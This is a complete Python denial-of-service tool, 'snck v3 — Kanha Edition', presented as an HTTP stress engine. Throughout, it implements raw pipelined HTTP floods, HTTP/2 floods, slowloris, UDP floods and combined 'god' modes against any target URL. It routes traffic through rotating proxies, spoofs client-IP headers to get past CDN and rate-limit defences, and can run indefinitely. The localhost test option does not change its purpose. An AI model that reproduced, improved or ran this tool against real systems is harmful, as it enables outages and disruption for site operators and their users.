#!/usr/bin/env python3
# -*- coding: utf-8 -*-
 █"""
    ██████╗███╗   ██╗ ██████╗██╗  ██╗
     ██╔════╝████╗  ██║██╔════╝██║ ██╔╝
     ███████╗██╔██╗ ██║██║     █████╔╝
     ╚════██║██║╚██╗██║██║     ██╔═██╗
     ███████║██║ ╚████║╚██████╗██║  ██╗
     ╚══════╝╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝

        snck v3 — Kanha Edition
        VPS-ready ultra http stress engine
"""

import os
import sys
import ssl
import time
import random
import socket
import string
import asyncio
import threading
from urllib.parse import urlparse
from collections import deque

try:
    import httpx
    HAVE_HX = True
except ImportError:
    HAVE_HX = False

try:
    import socks
    HAVE_SOCKS = True
except ImportError:
    HAVE_SOCKS = False


# ==========================================================
# POOLS
# ==========================================================

UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
]

REF = [
    "https://google.com/", "https://google.co.th/", "https://duckduckgo.com/",
    "https://facebook.com/", "https://youtube.com/", "https://yandex.com/",
    "https://bing.com/", "https://reddit.com/", "https://twitter.com/",
    "https://instagram.com/", "https://linkedin.com/", "https://pinterest.com/",
    "https://tumblr.com/", "https://medium.com/", "https://quora.com/",
    "https://wikipedia.org/", "https://amazon.com/", "https://netflix.com/",
]

PATHS = ["/", "/index.html", "/home", "/api", "/search", "/login", "/feed",
         "/products", "/images", "/assets", "/static", "/favicon.ico"]

_ALNUM = string.ascii_letters + string.digits


def rnd(n=10):
    return ''.join(random.choices(_ALNUM, k=n))


def rnd_ip():
    return "{}.{}.{}.{}".format(
        random.randint(1, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(1, 254),
    )


def rnd_path():
    p = random.choice(PATHS)
    if random.random() < 0.5:
        p += "?{}={}".format(rnd(6), rnd(8))
    return p


def clear():
    os.system("cls" if os.name == "nt" else "clear")


# ==========================================================
# PROXY POOL
# ==========================================================

class ProxyPool:
    def __init__(self):
        self.lock = threading.Lock()
        self.list = []
        self.bad = set()

    def load(self, path):
        try:
            with open(path) as f:
                with self.lock:
                    self.list = [l.strip() for l in f
                                 if l.strip() and not l.startswith("#")]
                    self.bad.clear()
            return len(self.list)
        except FileNotFoundError:
            return 0

    def get(self):
        with self.lock:
            avail = [p for p in self.list if p not in self.bad]
            if not avail:
                self.bad.clear()
                avail = self.list
            if not avail:
                return None
            return random.choice(avail)

    def mark_bad(self, p):
        if p:
            with self.lock:
                self.bad.add(p)

    def count(self):
        with self.lock:
            return len(self.list)


proxies = ProxyPool()


def parse_proxy(px):
    if not px:
        return None
    if "://" not in px:
        px = "http://" + px
    u = urlparse(px)
    return {
        "scheme": u.scheme,
        "host": u.hostname,
        "port": u.port or (1080 if u.scheme.startswith("socks") else 8080),
        "user": u.username,
        "pass": u.password,
    }


# ==========================================================
# STATS
# ==========================================================

class Stats:
    def __init__(self):
        self.sent = 0
        self.ok = 0
        self.err = 0
        self.blocked = 0
        self.conn = 0
        self.lock = threading.Lock()
        self.start = time.time()
        self.history = deque(maxlen=60)

    def hit(self, ok=True, blocked=False, conn=0):
        with self.lock:
            self.sent += 1
            if ok:
                self.ok += 1
            else:
                self.err += 1
            if blocked:
                self.blocked += 1
            if conn:
                self.conn += conn

    def rate(self):
        return self.sent / max(time.time() - self.start, 0.001)

    def instant(self):
        with self.lock:
            return sum(self.history) / max(len(self.history), 1)

    def ratio(self):
        with self.lock:
            return (self.ok / max(self.sent, 1)) * 100.0


stats = Stats()


def reporter(stop_flag):
    last = 0
    last_t = time.time()
    while not stop_flag.is_set():
        time.sleep(1)
        now = stats.sent
        dt = time.time() - last_t
        inst = (now - last) / max(dt, 0.001)
        stats.history.append(inst)
        last, last_t = now, time.time()
        bar = "#" * min(40, int(inst / 200))
        try:
            print(
                "\r[+] sent={:>11}  ok={:>11}  err={:>8}  "
                "block={:>6}  conn={:>6}  {:>7.0f}/s  {:<40}".format(
                    stats.sent, stats.ok, stats.err,
                    stats.blocked, stats.conn, inst, bar,
                ),
                end="", flush=True,
            )
        except Exception:
            pass


# ==========================================================
# TARGET
# ==========================================================

def parse_target(url):
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    p = urlparse(url)
    scheme = p.scheme
    host = p.hostname
    port = p.port or (443 if scheme == "https" else 80)
    path = p.path or "/"
    return scheme, host, port, path, "{}://{}:{}{}".format(scheme, host, port, path)


# ==========================================================
# TLS CONTEXT (cached)
# ==========================================================

_TLS_CTX = None
_TLS_LOCK = threading.Lock()


def get_tls_ctx():
    global _TLS_CTX
    if _TLS_CTX is None:
        with _TLS_LOCK:
            if _TLS_CTX is None:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                try:
                    ctx.set_ciphers("HIGH:!aNULL:!MD5:!RC4")
                except Exception:
                    pass
                _TLS_CTX = ctx
    return _TLS_CTX


# ==========================================================
# RAW — pipelined socket core
# ==========================================================

class RawFlooder(threading.Thread):
    def __init__(self, scheme, host, port, base_path, host_hdr, stop_flag,
                 pipeline=40, dynamic=True):
        super().__init__(daemon=True)
        self.scheme = scheme
        self.host = host
        self.port = port
        self.base_path = base_path
        self.host_hdr = host_hdr
        self.stop_flag = stop_flag
        self.tls = (scheme == "https")
        self.pipeline = pipeline
        self.dynamic = dynamic
        self.px = None

    def _open(self):
        px = parse_proxy(proxies.get())

        if px and HAVE_SOCKS and px["scheme"].startswith("socks"):
            try:
                s = socks.socksocket()
                proto = socks.SOCKS5 if "5" in px["scheme"] else socks.SOCKS4
                s.set_proxy(proto, px["host"], px["port"],
                            username=px["user"], password=px["pass"])
                s.settimeout(6)
                s.connect((self.host, self.port))
                if self.tls:
                    s = get_tls_ctx().wrap_socket(s, server_hostname=self.host)
                self.px = px
                return s
            except Exception:
                proxies.mark_bad(proxies.get())

        if px and px["scheme"].startswith("http"):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(6)
                s.connect((px["host"], px["port"]))
                connect = "CONNECT {}:{} HTTP/1.1\r\nHost: {}:{}\r\n".format(
                    self.host, self.port, self.host, self.port)
                if px["user"]:
                    import base64
                    cred = base64.b64encode(
                        "{}:{}".format(px["user"], px["pass"]).encode()
                    ).decode()
                    connect += "Proxy-Authorization: Basic {}\r\n".format(cred)
                connect += "\r\n"
                s.sendall(connect.encode())
                resp = s.recv(1024)
                if b"200" not in resp.split(b"\r\n")[0]:
                    raise Exception("proxy reject")
                if self.tls:
                    s = get_tls_ctx().wrap_socket(s, server_hostname=self.host)
                self.px = px
                return s
            except Exception:
                proxies.mark_bad(proxies.get())

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(6)
        s.connect((self.host, self.port))
        if self.tls:
            s = get_tls_ctx().wrap_socket(s, server_hostname=self.host)
        self.px = None
        return s

    def _req(self):
        fwd = rnd_ip()
        qs = "{}={}&{}={}&_={}{}".format(
            rnd(10), rnd(14), rnd(10), rnd(14),
            int(time.time() * 1000), rnd(4),
        )
        lines = [
            "GET {}?{} HTTP/1.1".format(self.base_path, qs),
            "Host: {}".format(self.host_hdr),
            "User-Agent: {}".format(random.choice(UA)),
            "Referer: {}".format(random.choice(REF)),
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language: en-US,en;q=0.9,th;q=0.8",
            "Accept-Encoding: gzip, deflate, br",
            "Cache-Control: no-cache, no-store, must-revalidate, max-age=0",
            "Pragma: no-cache",
            "Expires: 0",
            "X-Forwarded-For: {}".format(fwd),
            "X-Real-IP: {}".format(fwd),
            "X-Originating-IP: {}".format(fwd),
            "X-Remote-IP: {}".format(rnd_ip()),
            "X-Remote-Addr: {}".format(rnd_ip()),
            "X-Client-IP: {}".format(rnd_ip()),
            "CF-Connecting-IP: {}".format(fwd),
            "True-Client-IP: {}".format(fwd),
            "X-Original-URL: /{}".format(rnd(8)),
            "X-Rewrite-URL: /{}".format(rnd(8)),
            "X-Forwarded-Host: {}.{}.com".format(rnd(6), rnd(4)),
            "X-Forwarded-Proto: https",
            "Forwarded: for={};proto=https".format(fwd),
            "Connection: keep-alive",
        ]
        return ("\r\n".join(lines) + "\r\n\r\n").encode()

    def run(self):
        sock = None
        try:
            sock = self._open()
            stats.hit(True, conn=1)
        except Exception:
            stats.hit(False)
            return

        try:
            sock.sendall(self._req() * (self.pipeline * 2))
        except Exception:
            stats.hit(False)
            try:
                sock.close()
            except Exception:
                pass
            return

        cur_pipeline = self.pipeline
        fail_streak = 0

        while not self.stop_flag.is_set():
            try:
                sock.sendall(self._req() * cur_pipeline)
                try:
                    data = sock.recv(32768)
                    if b"429" in data or b"503" in data:
                        stats.hit(True, blocked=True)
                        if self.dynamic:
                            cur_pipeline = max(5, cur_pipeline // 2)
                    else:
                        stats.hit(True)
                        fail_streak = 0
                        if self.dynamic and cur_pipeline < self.pipeline:
                            cur_pipeline = min(self.pipeline, cur_pipeline + 2)
                except socket.timeout:
                    stats.hit(True)
            except Exception:
                stats.hit(False)
                fail_streak += 1
                try:
                    sock.close()
                except Exception:
                    pass
                if fail_streak > 5:
                    time.sleep(0.5)
                    fail_streak = 0
                try:
                    sock = self._open()
                    stats.hit(True, conn=1)
                    cur_pipeline = max(5, cur_pipeline // 2)
                except Exception:
                    time.sleep(0.3)
                    continue

        try:
            sock.close()
        except Exception:
            pass


# ==========================================================
# H2 — HTTP/2 multiplexed
# ==========================================================

async def h2_worker(client, base_url, stop_flag):
    while not stop_flag.is_set():
        try:
            url = "{}?{}={}&_={}".format(
                base_url, rnd(10), rnd(14), int(time.time() * 1000))
            r = await client.get(url, headers={
                "User-Agent": random.choice(UA),
                "Referer": random.choice(REF),
                "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
                "Cache-Control": "no-cache, no-store, max-age=0",
                "Pragma": "no-cache",
                "X-Forwarded-For": rnd_ip(),
                "X-Real-IP": rnd_ip(),
                "CF-Connecting-IP": rnd_ip(),
            }, timeout=4.0)
            blocked = r.status_code in (403, 429, 503)
            stats.hit(r.status_code < 500, blocked=blocked)
        except Exception:
            stats.hit(False)


async def h2_runner(base_url, streams, stop_flag):
    limits = httpx.Limits(max_connections=streams,
                          max_keepalive_connections=streams)
    async with httpx.AsyncClient(
        http2=True, limits=limits, verify=False, follow_redirects=False,
        timeout=httpx.Timeout(4.0, connect=3.0),
    ) as c:
        tasks = [asyncio.create_task(h2_worker(c, base_url, stop_flag))
                 for _ in range(streams)]
        await asyncio.gather(*tasks, return_exceptions=True)


def h2_thread(base_url, streams, stop_flag):
    try:
        asyncio.run(h2_runner(base_url, streams, stop_flag))
    except Exception:
        pass


# ==========================================================
# SLOWLORIS
# ==========================================================

def slow_worker(host, port, tls, stop_flag, per_thread=300):
    def _open():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(12)
        s.connect((host, port))
        if tls:
            s = get_tls_ctx().wrap_socket(s, server_hostname=host)
        return s

    sock_list = []
    while not stop_flag.is_set():
        while len(sock_list) < per_thread and not stop_flag.is_set():
            try:
                s = _open()
                s.send("GET /?{} HTTP/1.1\r\n".format(rnd(12)).encode())
                s.send("Host: {}\r\n".format(host).encode())
                s.send("User-Agent: {}\r\n".format(random.choice(UA)).encode())
                s.send("Accept: */*\r\n".encode())
                s.send("X-Forwarded-For: {}\r\n".format(rnd_ip()).encode())
                sock_list.append(s)
                stats.hit(True, conn=1)
            except Exception:
                stats.hit(False)
                break

        time.sleep(random.uniform(8, 15))
        for s in list(sock_list):
            try:
                s.send("X-{}: {}\r\n".format(rnd(8), rnd(40)).encode())
            except Exception:
                try:
                    s.close()
                except Exception:
                    pass
                sock_list.remove(s)
                stats.hit(False)


# ==========================================================
# UDP
# ==========================================================

def udp_worker(host, port, stop_flag, payload_size=1400, batch=100):
    try:
        addr = socket.gethostbyname(host)
    except Exception:
        return
    payload_pool = [os.urandom(payload_size) for _ in range(10)]
    while not stop_flag.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(1)
            for _ in range(batch):
                s.sendto(random.choice(payload_pool), (addr, port))
                stats.hit(True)
            s.close()
        except Exception:
            stats.hit(False)


# ==========================================================
# LAUNCHER
# ==========================================================

def run_attack(mode, url, threads, duration):
    global stats
    stats = Stats()

    scheme, host, port, path, full = parse_target(url)
    host_hdr = host if port in (80, 443) else "{}:{}".format(host, port)
    stop_flag = threading.Event()

    print("")
    print("  ---------------------------------------------")
    print("  target      : {}".format(full))
    print("  mode        : {}".format(mode.upper()))
    print("  threads     : {}".format(threads))
    print("  duration    : {}".format(
        "forever" if duration == 0 else "{}s".format(duration)))
    print("  proxies     : {}".format(
        proxies.count() if proxies.count() else "none (direct IP)"))
    print("  socks5      : {}".format("ready" if HAVE_SOCKS else "off"))
    print("  http2       : {}".format("ready" if HAVE_HX else "off"))
    print("  ---------------------------------------------")
    print("")

    threading.Thread(target=reporter, args=(stop_flag,), daemon=True).start()

    try:
        if mode == "raw":
            for _ in range(threads):
                RawFlooder(scheme, host, port, path, host_hdr, stop_flag).start()

        elif mode == "h2":
            if not HAVE_HX:
                print("[!] install: pip3 install httpx[http2]")
                return
            loops = max(1, threads // 300)
            per = threads // loops
            for _ in range(loops):
                threading.Thread(
                    target=h2_thread, args=(full, per, stop_flag),
                    daemon=True,
                ).start()

        elif mode == "slow":
            per = max(1, threads // 10)
            for _ in range(per):
                threading.Thread(
                    target=slow_worker,
                    args=(host, port, scheme == "https", stop_flag),
                    daemon=True,
                ).start()

        elif mode == "udp":
            for _ in range(threads):
                threading.Thread(
                    target=udp_worker,
                    args=(host, port, stop_flag),
                    daemon=True,
                ).start()

        elif mode == "mixed":
            half = threads // 2
            for _ in range(half):
                RawFlooder(scheme, host, port, path, host_hdr, stop_flag).start()
            slow_n = max(1, half // 12)
            for _ in range(slow_n):
                threading.Thread(
                    target=slow_worker,
                    args=(host, port, scheme == "https", stop_flag),
                    daemon=True,
                ).start()
            if HAVE_HX:
                threading.Thread(
                    target=h2_thread, args=(full, 400, stop_flag),
                    daemon=True,
                ).start()

        elif mode == "god":
            q = max(1, threads // 4)
            for _ in range(q):
                RawFlooder(scheme, host, port, path, host_hdr, stop_flag).start()
            slow_n = max(1, q // 12)
            for _ in range(slow_n):
                threading.Thread(
                    target=slow_worker,
                    args=(host, port, scheme == "https", stop_flag),
                    daemon=True,
                ).start()
            if HAVE_HX:
                threading.Thread(
                    target=h2_thread, args=(full, q, stop_flag),
                    daemon=True,
                ).start()
            udp_n = max(1, q // 4)
            for _ in range(udp_n):
                threading.Thread(
                    target=udp_worker,
                    args=(host, port, stop_flag),
                    daemon=True,
                ).start()

        if duration > 0:
            time.sleep(duration)
            stop_flag.set()
        else:
            while True:
                time.sleep(1)

    except KeyboardInterrupt:
        print("\n\n[!] ctrl+c — stopping")
        stop_flag.set()

    time.sleep(0.8)
    elapsed = time.time() - stats.start
    print("\n\n[=] summary")
    print("    sent       : {:,}".format(stats.sent))
    print("    ok         : {:,}".format(stats.ok))
    print("    err        : {:,}".format(stats.err))
    print("    blocked    : {:,}".format(stats.blocked))
    print("    conn       : {:,}".format(stats.conn))
    print("    elapsed    : {:.1f}s".format(elapsed))
    print("    avg rate   : {:,.0f} req/s".format(stats.sent / max(elapsed, 0.1)))
    print("    success    : {:.1f}%".format(stats.ratio()))
    print("")


# ==========================================================
# MENU
# ==========================================================

BANNER = r"""
     ███████╗███╗   ██╗ ██████╗██╗  ██╗
     ██╔════╝████╗  ██║██╔════╝██║ ██╔╝
     ███████╗██╔██╗ ██║██║     █████╔╝
     ╚════██║██║╚██╗██║██║     ██╔═██╗
     ███████║██║ ╚████║╚██████╗██║  ██╗
     ╚══════╝╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝

        snck v3 — Kanha Edition
        VPS-ready ultra http stress engine
"""


def ask(prompt, default=None, cast=str):
    while True:
        try:
            v = input(prompt).strip()
        except EOFError:
            return default if default is not None else ""
        if not v and default is not None:
            return default
        try:
            return cast(v)
        except Exception:
            print("  invalid value, try again")


def menu():
    clear()
    print(BANNER)
    print("  proxy pool: {}    socks5: {}    http2: {}\n".format(
        proxies.count(),
        "ON" if HAVE_SOCKS else "OFF",
        "ON" if HAVE_HX else "OFF",
    ))
    print("  [1]  RAW   — http/1.1 pipelined socket (fastest)")
    print("  [2]  H2    — http/2 multiplex")
    print("  [3]  SLOW  — slowloris half-open connections")
    print("  [4]  UDP   — volumetric datagram")
    print("  [5]  MIX   — raw + slow + h2")
    print("  [6]  GOD   — everything at once")
    print("  [7]  load proxy list")
    print("  [8]  test on localhost")
    print("  [0]  exit")
    print("")

    choice = ask("select > ", cast=str)

    if choice == "0":
        print("\nbye kanha\n")
        sys.exit(0)

    if choice == "7":
        path = input("proxy list path > ").strip()
        n = proxies.load(path)
        if n:
            print("[+] loaded {} proxies".format(n))
        else:
            print("[!] empty or missing file")
        time.sleep(1.2)
        return menu()

    if choice == "8":
        print("\n[i] run this in another terminal first: python3 -m http.server 8000\n")
        threads = ask("threads [300] > ", default=300, cast=int)
        duration = ask("duration secs [10] > ", default=10, cast=int)
        run_attack("raw", "http://127.0.0.1:8000", threads, duration)
        input("\nenter to return to menu")
        return

    mode_map = {
        "1": "raw", "2": "h2", "3": "slow",
        "4": "udp", "5": "mixed", "6": "god",
    }
    if choice not in mode_map:
        print("[!] invalid choice")
        time.sleep(1)
        return menu()

    mode = mode_map[choice]
    print("")
    url = input("target url > ").strip()
    if not url:
        print("[!] url required")
        time.sleep(1)
        return menu()

    defaults = {
        "raw": 1500, "h2": 4000, "slow": 120,
        "udp": 200, "mixed": 2500, "god": 3000,
    }
    d = defaults[mode]
    threads = ask("threads [{}] > ".format(d), default=d, cast=int)
    duration = ask("duration secs (0 = forever) [60] > ", default=60, cast=int)

    print("")
    ok = input(
        "attack {}  mode={}  threads={}  {}s  -- start? (y/n) > ".format(
            url, mode, threads, duration)
    ).strip().lower()
    if ok != "y":
        print("[!] cancelled")
        time.sleep(0.8)
        return menu()

    run_attack(mode, url, threads, duration)
    input("\nenter to return to menu")


def main():
    if len(sys.argv) > 1:
        import argparse
        ap = argparse.ArgumentParser()
        ap.add_argument("url")
        ap.add_argument("-m", "--mode", default="raw",
                        choices=["raw", "h2", "slow", "udp", "mixed", "god"])
        ap.add_argument("-t", "--threads", type=int, default=1500)
        ap.add_argument("-d", "--duration", type=int, default=0)
        ap.add_argument("-p", "--proxies", help="proxy list file")
        a = ap.parse_args()
        if a.proxies:
            proxies.load(a.proxies)
        run_attack(a.mode, a.url, a.threads, a.duration)
        return

    while True:
        try:
            menu()
        except KeyboardInterrupt:
            print("\n[!] exit")
            sys.exit(0)
        except Exception as e:
            print("[!] error: {}".format(e))
            time.sleep(1.2)


if __name__ == "__main__":
    main()
